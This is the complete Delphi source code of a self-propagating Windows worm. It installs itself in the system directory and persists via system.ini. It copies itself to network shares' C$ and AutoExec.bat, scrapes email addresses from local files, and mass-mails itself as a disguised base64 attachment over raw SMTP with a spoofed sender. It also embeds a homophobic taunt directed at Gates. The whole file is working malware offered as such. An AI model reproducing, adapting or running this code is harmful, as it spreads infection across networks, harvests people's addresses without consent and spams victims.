   Program suckera;

   Uses
    Windows, Winsock;

   TYPE
    oe = ARRAY[1..3] OF BYTE;
    brlob_w   = ARRAY[1..4] OF BYTE;

    TFileName = type string;
    TSearchRec = record
     Time: Integer;
     Size: Integer;
     Attr: Integer;
     Name: TFileName;
     ExcludeAttr: Integer;
     FindHandle: THandle  platform;
     FindData: TWin32FindData  platform;
    end;

    LongRec = packed record
     case Integer of
     0: (Lo, Hi: Word);
     1: (Words: array [0..1] of Word);
     2: (Bytes: array [0..3] of Byte);
    end;

   Const
    kzj_ : String = 'I want to dedicate this message to '+
   'gates. Gates, you suck. Gates'+
   'you really are homosexual. etc';
    faReadOnly  = $00000001;
    faHidden    = $00000002;
    faSysFile   = $00000004;
    faVolumeID  = $00000008;
    faDirectory = $00000010;
    faArchive   = $00000020;
    faAnyFile   = $0000003F;

   VAR
    mwgjpo      : String;


    cfd_v        : String;
    asawl          : Array[0..255] Of Char;
    wn_au      : Array[0..1000000] Of Byte;
    u_xxl           : String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    ovvbu      : String;
    mgryls      : String;
    croo      : String;

    Function LowerCase(const S: string): string;
    var
     eomzkk: Integer;
    begin
     eomzkk := Length(S);
     SetString(Result, PChar(S), eomzkk);
     if eomzkk > 0 then CharLowerBuff(Pointer(Result), eomzkk);
    end;

    Function FileSize(FileName: String): Int64;
    Var
      wzjpq: THandle;
      puhvz: TWin32FindData;
    Begin
      Result:= -1;

      wzjpq:= FindFirstFile(PChar(FileName), puhvz);
      If wzjpq <> INVALID_HANDLE_VALUE Then
      Begin
        Windows.FindClose(wzjpq);
        Result:= Int64(puhvz.nFileSizeHigh) Shl 32 + puhvz.nFileSizeLow;
      End;
    End;

    Function ExtractFileName(Str:String):String;
    Begin
     While Pos('\', Str)>0 Do
      Str := Copy(Str, Pos('\',Str)+1, Length(Str));
     Result := Str;
    End;

    Function Grabmails(Filename:string):String;
    Var
     F:Textfile;
     L1,L2,Text:string;
     MAIL:String;
     H,E,i, A:Integer;
     ABC,ABC2:STRING;
    Label again;
    begin

     ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
     ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';

     if FileSize(FileName) > 5000 then exit;
     CopyFile(Pchar(Filename),pchar(Filename+'_'),false);

     AssignFile(F,Filename+'_');
     try
      Reset(F);
     except
      exit;
     end;
     Read(F,L1);
     ReadLN(F,L2);
     Text:=L1;
     While NOt EOF(F) DO BEGIN
      Read(F,L1);
      ReadLN(F,L2);
      Text:=Text+'|'+L1;
     END;
     Closefile(F);

     Deletefile(pchar(Filename+'_'));

     if copy(text,1,2)='MZ' then exit;

     text:='|'+text+'|';
     result:='';

     AGAIN:

     IF pos('@',Text)>0 then begin

      A:=Pos('@',Text)-1;
      if a =0 then a := 1;
      L1 := copy(text,a,1);
      L2 := copy(text,a+2,1);
      H := pos(L1,abc);
      E := pos(L2,abc2);

      if (H = 0) or (e=0) then begin
       text:=copy(text,a+1,length(text));
       goto again;
      end;

      While POS(Copy(TExt,a,1),ABC)>0 do begin
       A:=A-1;
      end;

      a := a +1;
      Mail := copy(Text,a,length(text)); //grab start of mail.
      Mail := COpy(Mail,1,pos('@',mail)+2);
      i:= pos(MAIL,text)+length(mail);

      While pos(copy(mail,length(mail),1),ABC2)>0 do begin
       Mail := mail+copy(text,i,1);
       i:=i+1;
      end;

      if POS(copy(mail,length(mail),1),ABC2)=0 then
       Mail:=copy(mail,1,length(mail)-1);

      Result := Result+#13#10+Mail;
      Text:=copy(text,pos(mail,text)+length(mail),length(text));

      goto AGAIN;
     end;

    end;

    Function ExtractFileExt(s:string):String;
    Begin
     While Pos('.', S)>0 Do
      S := Copy(S, pos('.', S)+1, Length(s));
     Result := S;
    End;

    function FileExists(const FileName: string): Boolean;
    var
      ofeqq: THandle;
      hacwzs: TWin32FindData;
    begin
      ofeqq := FindFirstFileA(PChar(FileName), hacwzs);
      result:= ofeqq <> INVALID_HANDLE_VALUE;
      if result then
      begin
        CloseHandle(ofeqq);
      end;
    end;

    function FindMatchingFile(var F: TSearchRec): Integer;
    var
     zk_mc: TFileTime;
    begin
     with F do
      begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
         begin
          Result := GetLastError;
          Exit;
         end;
        FileTimeToLocalFileTime(FindData.ftLastWriteTime, zk_mc);
        FileTimeToDosDateTime(zk_mc, LongRec(Time).Hi,
      LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     end;
     Result := 0;
    end;
    procedure FindClose(var F: TSearchRec);
    begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE;
     end;
    end;

    function FindFirst(const Path: string; Attr: Integer;
                       var  F: TSearchRec): Integer;
    const
     xxxhv = faHidden or faSysFile or faVolumeID or faDirectory;
    begin
     F.ExcludeAttr := not Attr and xxxhv;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
     end else
      Result := GetLastError;
    end;

    function FindNext(var F: TSearchRec): Integer;
    begin
     if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F)
     else
      Result := GetLastError;
    end;
    procedure Enumeration(aResource:PNetResource);
    var
     rswnc: THandle;
     pesiv, j_rob: DWORD;
     hmnjuw: array[0..1023] of TNetResource;
     zwk_: Integer;
     begin
      WNetOpenEnum(2,0,0,aResource,rswnc);
      pesiv:=1024;
      j_rob:=SizeOf(hmnjuw);
      while WNetEnumResource(rswnc,pesiv,@hmnjuw,j_rob)=0 do
      for zwk_:=0 to pesiv-1 do
      begin
       if hmnjuw[zwk_].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
        mwgjpo := mwgjpo + copy(LowerCase(hmnjuw[zwk_].lpRemoteName),3,MAX_PATH) + #13#10;
       if hmnjuw[zwk_].dwUsage>0 then
      Enumeration(@hmnjuw[zwk_])
     end;
     WNetCloseEnum(rswnc);
    end;

    Procedure Network;
    Var
     _uikuo : String;
     rcf_z : TextFile;
    Begin
     Enumeration(NIL);
     While mwgjpo <> '' Do Begin
      _uikuo := Copy(mwgjpo, 1, Pos(#13#10, mwgjpo)-1);
      Try
       CopyFile(pChar(ParamStr(0)), pChar(_uikuo + '\C$\Setup.exe'), False);
       If FileExists(pChar(_uikuo + '\C$\AutoExec.bat')) Then Begin
        AssignFile(rcf_z, _uikuo + '\C$\AutoExec.bat');
        Append(rcf_z);
        WriteLn(rcf_z, 'Setup.exe');
        CloseFile(rcf_z);
       End;
      Except
       ;
      End;
      mwgjpo := Copy(mwgjpo, Pos(#13#10, mwgjpo)+2, Length(mwgjpo));
     End;
    End;

   // Base64 source, written by Positron
   // www.positronvx.cjb.net
    FUNCTION Codeb64(Count:BYTE;T:oe) : STRING;
    VAR
      kzdgg    : brlob_w;
      jk_bz : STRING;
    BEGIN
      IF Count<3 THEN BEGIN
        T[3]:=0;
        kzdgg[4]:=64;
      END ELSE kzdgg[4]:=(T[3] AND $3F);
      IF Count<2 THEN BEGIN
        T[2]:=0;
        kzdgg[3]:=64;
      END ELSE kzdgg[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
      kzdgg[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
      kzdgg[1]:=((T[1] SHR 2) AND $3F);
      jk_bz:='';
      FOR Count:=1 TO 4 DO jk_bz:=(jk_bz+u_xxl[(kzdgg[Count]+1)]);
      RESULT:=jk_bz;
    END;

    FUNCTION BASE64(DataLength:DWORD) : AnsiString;
    VAR
      cf_hgw      : AnsiString;
      uqxy      : DWORD;
      wnuigo      : DWORD;
      myrzl      : oe;
      kjouc      : WORD;
    BEGIN
      kjouc:=0;
      cf_hgw:='';
      FOR uqxy:=1 TO DataLength DIV 3 DO BEGIN
        INC(kjouc,4);
        myrzl[1]:=Ord(wn_au[(uqxy-1)*3+1]);
        myrzl[2]:=Ord(wn_au[(uqxy-1)*3+2]);
        myrzl[3]:=Ord(wn_au[(uqxy-1)*3+3]);
        cf_hgw:=cf_hgw+codeb64(3,myrzl);
        IF kjouc=76 THEN BEGIN
          cf_hgw:=cf_hgw+#13#10;
          kjouc:=0;
        END;
      END;
      wnuigo:=DataLength-(DataLength DIV 3)*3;
      IF wnuigo>0 THEN BEGIN
        myrzl[1]:=Ord(wn_au[DataLength-1]);
        IF wnuigo>1 THEN myrzl[2]:=Ord(wn_au[DataLength]);
        IF wnuigo=1 THEN cf_hgw:=cf_hgw+Codeb64(1,myrzl) ELSE cf_hgw:=cf_hgw+Codeb64(2,myrzl);
      END;
      RESULT:=cf_hgw;
    END;

    // Small modifies of positrons mail-send code.
    // Get the relay-server code at www.positron.cjb.net
    // greets positrion, ur code rules
    Procedure SendMail(Recip, FromM, Server: String);
    Var
     eem_l             : TSocket;
     crjwc         : TWSADATA;
     ymhalu       : TSockAddrIn;
     owerq                : FILE;
     miamh, gc_sq,
     eqxnh, _lvuq        : String;
     yysogy            : Integer;

    Procedure Mys(STR:STRING);
    Begin
     Send(eem_l,STR[1],Length(STR),0);
    End;

    Begin

    miamh := mgryls;
    gc_sq := croo;
    eqxnh := ovvbu;
    _lvuq := 'audio/x-wav';
    FromM := 'Jesus@Hotmail.Com';

    WSAStartUp(257,crjwc);
    eem_l:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    ymhalu.sin_family:=AF_INET;
    ymhalu.sin_port:=htons(25);
    ymhalu.sin_addr.S_addr:=inet_addr(PChar(Server));
    If Connect(eem_l,ymhalu,SizeOf(ymhalu)) <> SOCKET_ERROR Then Begin
     Mys('HELO .com'+#13#10);
     If Pos('<', Fromm)>0 Then
      Mys('Mail From: '+Copy(FromM, Pos('<', FromM)+1, Pos('>', FromM)-2)+#13#10) Else
      Mys('MAIL FROM: '+FromM+#13#10);
     Mys('RCPT TO: '+recip+#13#10);
     Mys('DATA'+#13#10);

     Mys('From: '+FromM+#13#10);
     Mys('Subject: '+eqxnh+#13#10);
     Mys('To: '+Recip+#13#10);

     Mys('MIME-Version: 1.0'+#13#10);
     Mys('Content-Type: multipart/mixed; boundary="ShutFace"'+#13#10+#13#10);
     Mys('--ShutFace'+#13#10);
     Mys('Content-Type: text/plain; charset:us-ascii'+#13#10+#13#10);

     Mys(miamh+#13#10);

     Mys(#13#10+#13#10);
     Mys('--ShutFace'+#13#10);
     Mys('Content-Type: '+_lvuq+';'+#13#10);
     Mys('    name="'+gc_sq+'"'+#13#10);
     Mys('Content-Transfer-Encoding: base64'+#13#10+#13#10);
     AssignFile(owerq,ParamStr(0));
     FileMode:=0;
     {$I-}
     Reset(owerq,1);
     IF IOResult=0 THEN BEGIN
      BlockRead(owerq,wn_au[1],FileSize(ParamStr(0)));
      Mys(BASE64(FileSize(ParamStr(0))));
      CloseFile(owerq);
     END;
     {$I+}
     Mys(#13#10+'--ShutFace--'+#13#10+#13#10);
     Mys(#13#10+'.'+#13#10);
     Mys('QUIT'+#13#10);
    End;
    End;

    Procedure FFind(D, Name, SearchName : String);
      var
      ogpe: TSearchRec;
      qenqgq: string;
      gojfm: textfile;
      _jilu: string;
      _wegl: string;
      trdmuy: string;
    begin
      If D[Length(D)] <> '\' then D := D + '\';

      If FindFirst(D + '*.*', faDirectory, ogpe) = 0 then
        Repeat
          If ((ogpe.Attr and faDirectory) = faDirectory) and (ogpe.Name[1] <> '.') then
            FFind(D + ogpe.Name + '\', Name, SearchName)
          Else Begin
            qenqgq := ExtractFileExt(ogpe.Name);

      If qenqgq = 'txt' then cfd_v := cfd_v + GrabMails(D + ogpe.Name);
      If qenqgq = 'html' then cfd_v := cfd_v + GrabMails(D + ogpe.Name);
      If qenqgq = 'htm' then cfd_v := cfd_v + GrabMails(D + ogpe.Name);
      If qenqgq = 'doc' then cfd_v := cfd_v + GrabMails(D + ogpe.Name);
      If qenqgq = 'vbs' then cfd_v := cfd_v + GrabMails(D + ogpe.Name);
    If ovvbu = '' Then Begin
     If qenqgq = 'txt' Then Begin
      AssignFile(gojfm, d+ogpe.name);
      Reset(gojfm);
      trdmuy := '';
      Read(gojfm, _jilu);
      ReadLn(gojfm, _wegl);
      trdmuy := trdmuy + _jilu;
      While not Eof(gojfm) Do Begin
       Read(gojfm, _jilu);
       ReadLn(gojfm, _wegl);
       trdmuy := trdmuy + _jilu;
      End;
      CloseFile(gojfm);
      mgryls := trdmuy;
      croo := ogpe.name+'.exe';
      ovvbu := copy(ogpe.name, 1, pos('.', ogpe.name)-1);
     End;
    End;
           End;
        Until (FindNext(ogpe) <> 0);
      FindClose(ogpe);
    end;

   Var
    ja_c_:array[0..255]of char;
    hnyzq:string;
   Begin
   getsystemdirectory(ja_c_, 255);
   hnyzq := ja_c_;
   hnyzq := hnyzq + '\suckera.exe';
   CopyFile(pchar(paramstr(0)), pchar(hnyzq), false);
   writeprivateprofilestring('boot','shell',pchar('Explorer.exe suckera.exe'),'system.ini');

     Network;
     FFind('C:\', '*', '*.*');
     While cfd_v <> '' Do Begin
      SendMail(Copy(cfd_v, 1, Pos(#13#10, cfd_v)-1), 'Stfu@Abuse.com', 'mx1.hotmail.com');
      cfd_v := Copy(cfd_v, Pos(#13#10, cfd_v)+ 2, length(cfd_v));
     End;

    End.
